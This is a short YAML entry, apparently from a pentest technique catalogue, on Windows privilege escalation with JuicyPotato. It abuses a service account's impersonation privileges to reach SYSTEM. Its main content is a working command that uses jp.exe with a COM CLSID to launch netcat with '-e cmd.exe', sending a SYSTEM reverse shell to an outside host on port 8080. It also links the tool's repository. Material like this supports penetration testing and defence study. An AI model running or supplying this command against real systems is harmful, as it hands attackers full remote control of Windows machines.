---
functions:
  privilege-escalation:
    - description: Leverage a service account with impersonatetoken  and assignprimarytoken to get system
      code: |
		C:\ColdFusion8\runtime\bin>jp.exe -t * -p nc.exe -a "10.10.14.20 8080 -e cmd.exe" -c {e60687f7-01a1-40aa-86ac-db1cbf673334} -l 13337
resources:
  https://github.com/ohpe/juicy-potato

  https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md
---